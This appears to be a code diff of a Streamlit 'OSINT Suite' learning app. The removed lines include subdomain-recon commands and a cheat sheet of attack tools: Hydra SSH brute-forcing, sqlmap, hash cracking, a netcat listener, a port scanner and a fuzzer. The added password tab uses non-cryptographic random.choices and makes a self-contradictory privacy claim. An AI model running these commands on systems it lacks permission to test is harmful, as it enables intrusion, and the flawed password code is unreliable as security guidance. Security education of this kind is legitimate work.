-              <a href='{url}' target='_blank' style='font-size:0.75rem;color:rgba(0,200,255,0.7);'>→ Search Google</a>
-            </div>""", unsafe_allow_html=True)
-        ec1, ec2 = st.columns(2)
-        ec1.link_button("Google Advanced Search", "https://google.com/advanced_search", use_container_width=True)
-        ec2.link_button("Exploit-DB GHDB", "https://www.exploit-db.com/google-hacking-database", use_container_width=True)
-
-# ========== TAB 13: Subdomain Recon ==========
-with tab13:
-    st.markdown("### 🌐 Subdomain Recon")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>Certificate transparency, DNS brute-force wordlists, and passive recon sources.</p>", unsafe_allow_html=True)
-    sd_domain = st.text_input("Domain", placeholder="example.com", key="sd_dom")
-    if st.button("🔍 Enumerate", use_container_width=True) and sd_domain:
-        d = sd_domain.strip().lower()
-
-        # crt.sh — certificate transparency
-        st.markdown("#### 📜 Certificate Transparency (crt.sh)")
-        with st.spinner("Querying crt.sh..."):
+        if is_ip:
+            sec("IP Geolocation")
             try:
-                r = requests.get(f"https://crt.sh/?q=%.{d}&output=json", timeout=10)
-                if r.status_code == 200:
-                    entries = r.json()
-                    subs = sorted({e['name_value'].strip().lower() for e in entries
-                                   if d in e.get('name_value','') and '*' not in e.get('name_value','')})
-                    st.success(f"✅ {len(subs)} unique subdomains via certificate transparency")
-                    for s in subs[:80]:
-                        st.markdown(f"<div class='result-card'><code>{s}</code></div>", unsafe_allow_html=True)
-                    if len(subs) > 80:
-                        st.info(f"Showing 80 of {len(subs)}. Use subfinder/amass for full list.")
-                else:
-                    st.warning("crt.sh returned no data")
-            except Exception as ex:
-                st.error(f"crt.sh error: {ex}")
+                geo = requests.get(
+                    f"http://ip-api.com/json/{tgt}?fields=status,country,city,isp,org,lat,lon",
+                    timeout=5).json()
+                if geo.get('status') == 'success':
+                    glass(f"<b>Country:</b> {geo.get('country','?')}<br>"
+                          f"<b>City:</b> {geo.get('city','?')}<br>"
+                          f"<b>ISP:</b> {geo.get('isp','?')}<br>"
+                          f"<b>Org:</b> {geo.get('org','?')}<br>"
+                          f"<b>Coordinates:</b> {geo.get('lat','?')}, {geo.get('lon','?')}")
+            except:
+                st.info("Couldn't fetch geolocation right now.")
 
-        # HackerTarget
-        st.markdown("#### 🎯 HackerTarget DNS lookup")
-        try:
-            ht = requests.get(f"https://api.hackertarget.com/hostsearch/?q={d}", timeout=8)
-            if ht.status_code == 200 and "error" not in ht.text.lower():
-                ht_subs = [line.split(",")[0] for line in ht.text.strip().splitlines() if "," in line]
-                for s in ht_subs[:30]:
-                    st.markdown(f"<div class='result-card'><code>{s}</code></div>", unsafe_allow_html=True)
-        except: pass
-
-        # Tool commands
-        with st.expander("⚙️ Local enumeration commands"):
-            st.code(f"""
-subfinder -d {d} -o subs.txt
-amass enum -passive -d {d}
-dnsrecon -d {d} -t brt -D /usr/share/wordlists/dnsmap.txt
-ffuf -u https://FUZZ.{d} -w subdomains-top1million-5000.txt -mc 200,301,302
-dnsx -l subs.txt -a -aaaa -cname -resp
-httpx -l subs.txt -status-code -title -tech-detect
-            """)
-
-        # Passive intel links
-        st.markdown("#### 🔗 Passive OSINT sources")
-        lc = st.columns(4)
-        lc[0].link_button("crt.sh", f"https://crt.sh/?q=%.{d}", use_container_width=True)
-        lc[1].link_button("SecurityTrails", f"https://securitytrails.com/list/apex_domain/{d}", use_container_width=True)
-        lc[2].link_button("VirusTotal", f"https://virustotal.com/gui/domain/{d}/relations", use_container_width=True)
-        lc[3].link_button("Shodan", f"https://shodan.io/search?query=hostname:{d}", use_container_width=True)
-
-# ========== TAB 14: Beginner Guide ==========
-with tab14:
-    st.markdown("### 📖 Beginner's Handbook")
-    st.markdown("<p style='color:rgba(160,200,240,0.7);font-size:0.85rem;'>From zero to confident — roadmaps, resources, and quick references for every level.</p>", unsafe_allow_html=True)
-    guide = st.selectbox("Topic", [
-        "🗺️ Learning Roadmap","🚩 CTF Quickstart","🔐 Linux Basics","🐍 Python for Hacking",
-        "📚 Free Learning Resources","🧰 Essential Toolbox","🔤 Terminology Glossary"
-    ], key="guide_cat")
-
-    if guide == "🗺️ Learning Roadmap":
-        stages = [
-            ("Stage 1 — Foundations (0–3 months)",
-             ["Linux command line (OverTheWire: Bandit)","Python basics (automate.withpython.com)","Networking: TCP/IP, DNS, HTTP","TryHackMe — Pre-Security path (free)"]),
-            ("Stage 2 — Core Skills (3–6 months)",
-             ["TryHackMe — Jr Penetration Tester path","Web vulnerabilities (PortSwigger Web Academy — free)","Cryptography basics (cryptohack.org)","CTF beginner competitions: picoCTF, CTFlearn"]),
-            ("Stage 3 — Hands-On (6–12 months)",
-             ["HackTheBox — Starting Point machines","OSCP preparation (TCM Security / Offensive Security)","Specialize: web / binary / forensics / crypto","CTFtime.org — join team competitions"]),
-            ("Stage 4 — Advanced",
-             ["HackTheBox Pro Labs (Offshore, RastaLabs)","Bug bounty: HackerOne, Bugcrowd","Certifications: OSCP, PNPT, CEH, eJPT","Contribute to open-source tools, write CVEs"]),
-        ]
-        for title, items in stages:
-            with st.expander(title):
-                for item in items:
-                    st.markdown(f"<div class='result-card'>▸ {item}</div>", unsafe_allow_html=True)
-
-    elif guide == "🚩 CTF Quickstart":
-        steps = [
-            ("Step 1: Read the challenge description carefully","Note the category (crypto, web, forensics, misc, pwn, rev). Every word can be a hint."),
-            ("Step 2: Identify the format","Run `file`, `strings`, `xxd` on any given file before anything else."),
-            ("Step 3: Google the obvious","Paste any strange strings, cipher-looking text, or error messages into Google + 'CTF'."),
-            ("Step 4: Check encoding layers","Data is often Base64 → URL-encoded → hex → ROT13. Use this tool's Multi-Decoder."),
-            ("Step 5: Look for the flag format","Most CTFs use flag{...} or ctf{...}. Search strings output for it."),
-            ("Step 6: Hint system","Many platforms (picoCTF, HTB) offer hints — use them, no shame."),
-            ("Step 7: Writeups","If stuck after 30 min, read writeups for similar old challenges — CTFtime.org has thousands."),
-        ]
-        for title, body in steps:
-            st.markdown(f"<div class='result-card'><b>{title}</b><br><span style='color:rgba(160,200,240,0.6);'>{body}</span></div>", unsafe_allow_html=True)
-
-    elif guide == "🔐 Linux Basics":
-        cmds = [
-            ("Navigation","cd /path   ls -la   pwd   find / -name file 2>/dev/null"),
-            ("File ops","cat file   less file   head/tail -n 20   cp src dst   mv src dst   rm file"),
-            ("Permissions","chmod 755 file   chown user:group file   ls -la (rwxrwxrwx)"),
-            ("Processes","ps aux   kill PID   top/htop   jobs   bg/fg"),
-            ("Network","ifconfig / ip a   netstat -tulnp   ss -tulnp   curl   wget   ping   traceroute"),
-            ("Search","grep -r 'pattern' /dir   grep -i (case insensitive)   grep -v (invert)"),
-            ("Pipes & redirect","cmd | cmd2   cmd > file   cmd >> file   cmd 2>&1   cmd < input"),
-            ("Useful shortcuts","Ctrl+C (kill)   Ctrl+Z (suspend)   Ctrl+D (EOF)   Tab (autocomplete)   !! (last cmd)"),
-        ]
-        for title, cmd in cmds:
-            st.markdown(f"<div class='result-card'><b>{title}</b><br><code style='font-size:0.8rem;'>{cmd}</code></div>", unsafe_allow_html=True)
-
-    elif guide == "🐍 Python for Hacking":
-        snippets = [
-            ("Port scanner", "import socket\nfor p in range(1,1025):\n    s=socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex(('target',p))==0: print(f'Open: {p}')\n    s.close()"),
-            ("XOR decrypt", "ct=bytes.fromhex('1a2b3c')\nkey=0x41\nprint(bytes([b^key for b in ct]))"),
-            ("HTTP request", "import requests\nr=requests.get('https://target.com',headers={'User-Agent':'Mozilla/5.0'})\nprint(r.status_code, r.text[:200])"),
-            ("Parse HTML", "from bs4 import BeautifulSoup\nsoup=BeautifulSoup(r.text,'html.parser')\nlinks=[a['href'] for a in soup.find_all('a',href=True)]"),
-            ("Base64 loop decode", "import base64\ns='dGVzdA=='\nwhile True:\n    try: s=base64.b64decode(s).decode()\n    except: break\nprint(s)"),
-            ("Simple fuzzer", "import requests\nwith open('wordlist.txt') as f:\n    for word in f:\n        r=requests.get(f'https://target.com/{word.strip()}')\n        if r.status_code==200: print(word.strip())"),
-        ]
-        for title, code in snippets:
-            with st.expander(f"📄 {title}"):
-                st.code(code, language="python")
-
-    elif guide == "📚 Free Learning Resources":
-        resources = [
-            ("TryHackMe","https://tryhackme.com","Best structured beginner platform. Free tier is huge."),
-            ("HackTheBox","https://hackthebox.com","Intermediate+. Realistic machines. Free starting point."),
-            ("picoCTF","https://picoctf.org","Beginner CTF by Carnegie Mellon. Always open."),
-            ("PortSwigger Web Academy","https://portswigger.net/web-security","Best free web hacking course, period."),
-            ("CryptoHack","https://cryptohack.org","Interactive cryptography CTF-style learning."),
-            ("OverTheWire","https://overthewire.org/wargames/","Linux + security wargames. Start with Bandit."),
-            ("CTFtime","https://ctftime.org","CTF calendar + writeups archive."),
-            ("HackTricks","https://book.hacktricks.xyz","Massive pentest reference book (free)."),
-            ("GTFOBins","https://gtfobins.github.io","Linux privesc via sudo/SUID binaries."),
-            ("LOLBAS","https://lolbas-project.github.io","Windows living-off-the-land binaries."),
-            ("PentesterLab","https://pentesterlab.com","Web security labs with certificates."),
-            ("TCM Security","https://tcm-sec.com","Affordable OSCP-prep video courses."),
-        ]
-        for name, url, desc in resources:
-            st.markdown(f"<div class='result-card'><b><a href='{url}' target='_blank'>{name}</a></b><br><span style='color:rgba(160,200,240,0.6);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
-
-    elif guide == "🧰 Essential Toolbox":
-        tools = [
-            ("Nmap","Network scanner","nmap -sV -sC target"),
-            ("Burp Suite","Web proxy/interceptor","Community edition free — portswigger.net"),
-            ("Metasploit","Exploitation framework","msfconsole"),
-            ("Wireshark","Packet capture/analysis","GUI — wireshark.org"),
-            ("Gobuster","Dir/subdomain brute-force","gobuster dir -u URL -w wordlist"),
-            ("SQLmap","SQL injection automation","sqlmap -u URL --dbs"),
-            ("John the Ripper","Password cracker","john --wordlist=rockyou.txt hash.txt"),
-            ("Hashcat","GPU hash cracker","hashcat -m 0 hash.txt rockyou.txt"),
-            ("Hydra","Login brute-forcer","hydra -l admin -P pass.txt ssh://target"),
-            ("Netcat","TCP Swiss army knife","nc -lvnp 4444  /  nc target 4444"),
-            ("Binwalk","Firmware/file extractor","binwalk -e file.bin"),
-            ("Volatility 3","Memory forensics","python3 vol.py -f mem.dmp windows.pslist"),
-        ]
-        for name, desc, cmd in tools:
-            st.markdown(f"<div class='result-card'><b>{name}</b> — {desc}<br><code style='font-size:0.78rem;'>{cmd}</code></div>", unsafe_allow_html=True)
-
-    elif guide == "🔤 Terminology Glossary":
-        terms = {
-            "OSINT": "Open Source Intelligence — gathering info from public sources.",
-            "CVE": "Common Vulnerabilities and Exposures — standardized vulnerability ID (e.g. CVE-2021-44228).",
-            "RCE": "Remote Code Execution — running arbitrary commands on a target system.",
-            "LFI/RFI": "Local/Remote File Inclusion — including server files via unvalidated input.",
-            "SSRF": "Server-Side Request Forgery — making the server fetch internal resources.",
-            "XSS": "Cross-Site Scripting — injecting scripts into pages viewed by other users.",
-            "SQLi": "SQL Injection — manipulating database queries via unsanitized input.",
-            "PrivEsc": "Privilege Escalation — gaining higher permissions (e.g., root/SYSTEM).",
-            "Lateral Movement": "Moving from one compromised host to others in the network.",
-            "C2 / C&C": "Command & Control — infrastructure used to control compromised machines.",
-            "Payload": "Code delivered/executed on a target (reverse shell, meterpreter, etc.).",
-            "OPSEC": "Operational Security — keeping your activities anonymous/undetectable.",
-            "Red Team": "Simulates real-world attackers in a controlled engagement.",
-            "Blue Team": "Defenders — SOC analysts, incident response, threat hunting.",
-            "Purple Team": "Red + Blue collaboration to improve detection and response.",
-            "CTF": "Capture The Flag — competitive security challenge competitions.",
-            "WAF": "Web Application Firewall — filters malicious HTTP traffic.",
-            "SIEM": "Security Info & Event Management — log aggregation and alerting platform.",
-            "IOC": "Indicator of Compromise — artifacts suggesting a breach (IP, hash, domain).",
-            "Zero-day": "Vulnerability unknown to the vendor with no available patch.",
-        }
-        for term, definition in terms.items():
-            st.markdown(f"<div class='result-card'><b><code>{term}</code></b><br>{definition}</div>", unsafe_allow_html=True)
+        sec("Threat Intelligence")
+        st.markdown("These sites have huge databases of known threats, malware, and scanned services:")
+        c1, c2, c3 = st.columns(3)
+        kind = 'ip-address' if is_ip else 'domain'
+        c1.link_button("VirusTotal", f"https://www.virustotal.com/gui/{kind}/{tgt}", use_container_width=True)
+        c2.link_button("Shodan", f"https://www.shodan.io/search?query={tgt}", use_container_width=True)
+        c3.link_button("AbuseIPDB", f"https://www.abuseipdb.com/check/{tgt}", use_container_width=True)
 
 
-st.markdown("""
-<div style='text-align:center;padding:2rem 0 1rem;'>
-  <div style='display:inline-block;background:linear-gradient(135deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02));backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:50px;padding:8px 24px;font-family:"Share Tech Mono",monospace;font-size:0.65rem;color:rgba(120,160,200,0.6);letter-spacing:0.12em;'>
-    🕵️ OSINT SUITE PRO &nbsp;·&nbsp; REAL DATA ONLY &nbsp;·&nbsp; v2.0 · 2026
-  </div>
-</div>
-""", unsafe_allow_html=True)
+# ── TAB 8: PASSWORDS ────────────────────────────────────────────────────
+with tab8:
+    sec("Password Tools")
+    st.markdown("""
+Three things you can do here:
+- **Check a password** — see how strong it actually is and what it would take to crack
+- **Generate passwords** — get secure random passwords you can actually use
+- **Hash text** — turn any string into MD5/SHA1/SHA256 (useful for CTFs and understanding how password storage works)
+    """)
+
+    pw_mode = st.radio("What do you need?", ["Check a password", "Generate passwords", "Hash something"], horizontal=True)
+
+    if pw_mode == "Check a password":
+        tip("Your password never leaves your browser — this check runs entirely on the server with no logging.")
+        pw_in = st.text_input("Password to check:", type="password", placeholder="type your password here", key="pw_in")
+        if st.button("Check it", key="pw_check") and pw_in:
+            p = pw_in
+            score = 0
+            notes = []
+            if len(p) >= 16: score += 3
+            elif len(p) >= 12: score += 2
+            elif len(p) >= 8: score += 1
+            else: notes.append("Too short — use at least 12 characters")
+            if re.search(r"[a-z]", p): score += 1
+            else: notes.append("Add lowercase letters")
+            if re.search(r"[A-Z]", p): score += 1
+            else: notes.append("Add uppercase letters")
+            if re.search(r"\d", p): score += 1
+            else: notes.append("Add numbers")
+            if re.search(r"[^a-zA-Z0-9]", p): score += 2
+            else: notes.append("Add symbols like !@#$%")
+            if score >= 8: ok("Strong password.")
+            elif score >= 5: warn("Decent password, but could be stronger.")
+            else: danger("Weak password — easy to crack.")
+            pills([("Length", len(p)), ("Score", f"{score}/9")])
+            for n in notes:
+                st.markdown(f"- {n}")
+
+    elif pw_mode == "Generate passwords":
+        tip("These are generated randomly each time. Passwords are never stored.")
+        col1, col2 = st.columns(2)
+        with col1: pw_len = st.slider("Length", 8, 64, 20)
+        with col2: pw_count = st.slider("How many", 1, 10, 5)
+        include_symbols = st.checkbox("Include symbols (!@#$%)", value=True)
+        if st.button("Generate", use_container_width=True):
+            chars = string.ascii_letters + string.digits
+            if include_symbols: chars += "!@#$%^&*-_=+"
+            for _ in range(pw_count):
+                st.code(''.join(random.choices(chars, k=pw_len)))
+
+    elif pw_mode == "Hash something":
+        st.markdown("""
+**Hashing** converts any text into a fixed-length string. Same input always gives the same output.
+Used to store passwords safely (though MD5 and SHA1 are outdated for that purpose now).
+
+Useful in CTFs when you need to generate a hash to compare with a target.
+        """)
+        text = st.text_input("Text to hash:", placeholder="hello world", key="hash_text")
+        if text:
+            st.code(f"MD5:     {hashlib.md5(text.encode()).hexdigest()}")
+            st.code(f"SHA-1:   {hashlib.sha1(text.encode()).hexdigest()}")
+            st.code(f"SHA-256: {hashlib.sha256(text.encode()).hexdigest()}")
+            st.code(f"SHA-512: {hashlib.sha512(text.encode()).hexdigest()}")
+
+
+st.markdown(
+    "<div style='text-align:center;color:#2a4050;font-size:.7rem;padding:.8rem 0 .4rem'>"
+    "OSINT Suite · built for learners and researchers · 2026"
+    "</div>",
+    unsafe_allow_html=True)
